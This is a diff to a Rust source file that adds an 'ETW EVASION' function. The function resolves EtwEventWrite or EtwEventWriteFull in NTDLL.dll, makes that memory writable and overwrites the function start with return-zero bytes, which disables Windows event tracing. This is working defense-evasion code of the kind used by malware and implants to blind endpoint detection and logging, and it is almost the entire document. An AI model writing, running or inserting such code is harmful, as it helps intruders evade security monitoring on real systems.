@@ -70,3 +70,62 @@ pub fn patch_etw() -> bool {
 
     return true;
 }
+
+// =======================================================================================================
+// ETW EVASION: WinAPI Event Write Patch
+// =======================================================================================================
+
+#[cfg(feature = "EvasionETWWinAPI")]
+use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress as GetProcAddressWinAPI};
+#[cfg(feature = "EvasionETWWinAPI")]
+use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};
+
+#[cfg(feature = "EvasionETWWinAPI")]
+#[derive(Eq, PartialEq)]
+pub enum Patch {
+    PatchEtwEventWrite,
+    PatchEtwEventWriteFull,
+}
+
+#[cfg(feature = "EvasionETWWinAPI")]
+pub fn patch_etw_write_functions_start(patch: Patch) -> Result<(), &'static str> {
+    let func_name: *const u8 = match patch {
+        Patch::PatchEtwEventWrite => b"EtwEventWrite\0".as_ptr(),
+        Patch::PatchEtwEventWriteFull => b"EtwEventWriteFull\0".as_ptr(),
+    };
+
+    unsafe {
+        let ntdll_handle = GetModuleHandleA(b"NTDLL.dll\0".as_ptr());
+        let etw_fun_address = GetProcAddressWinAPI(ntdll_handle, func_name);
+        let etw_fun_ptr = etw_fun_address.unwrap() as *mut u8;
+
+        let patch_shellcode: &[u8] = &[
+            0x33, 0xC0, // xor eax, eax
+            0xC3,       // ret
+        ];
+
+        let mut old_protect: u32 = 0;
+        
+        let result = VirtualProtect(
+            etw_fun_ptr as *const _,
+            patch_shellcode.len(),
+            PAGE_EXECUTE_READWRITE,
+            &mut old_protect,
+        );
+
+        std::ptr::copy_nonoverlapping(
+            patch_shellcode.as_ptr(),
+            etw_fun_ptr,
+            patch_shellcode.len(),
+        );
+
+        let result = VirtualProtect(
+            etw_fun_ptr as *const _,
+            patch_shellcode.len(),
+            old_protect,
+            &mut old_protect,
+        );
+    }
+    Ok(())
+}
+
